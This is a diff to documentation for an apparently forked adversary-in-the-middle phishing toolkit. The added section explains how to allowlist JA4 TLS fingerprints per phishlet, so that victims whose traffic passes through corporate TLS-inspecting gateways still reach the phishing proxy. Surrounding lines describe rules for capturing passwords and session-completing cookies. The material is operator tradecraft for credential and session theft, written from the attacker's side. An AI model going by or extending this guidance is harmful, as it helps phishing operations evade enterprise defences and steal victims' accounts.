@@ -57,6 +57,16 @@ auth_tokens:                         # PILLAR 3: session-completing cookies
 | Token values in `search` regexes must be anchored enough not to match URL params | e.g. hostname checks in code must use parsed hostname, never substring over the whole URL (a `continue=` param once caused false "done") |
 | Autocomplete/hidden fields | capture rules must target the VISIBLE field — hidden prefilled inputs (e.g. hiddenPassword) silently match first and capture empty values |
 
+## Per-phishlet botguard JA4 exceptions
+
+`bg_ja4_allow` (optional YAML list of JA4 prefixes) whitelists corporate
+TLS-inspection variants for THIS phishlet only, OR-merged with the node-level
+`-bg-ja4` flag list — hot-reload applies immediately. When a victim network's
+SWG (Umbrella/Palo Alto) re-terminates TLS, victims arrive with the appliance's
+fingerprint; read the exact variant from the node journal
+(`botguard: JA4 not in allowlist ... <ja4>`) and add it. Each SWG profile yields
+a distinct but stable variant (field-observed: two profiles one digit apart).
+
 ## Lure options (fork extensions)
 
 - **token-gate** (default via API): lure carries `token: auto`; requests without
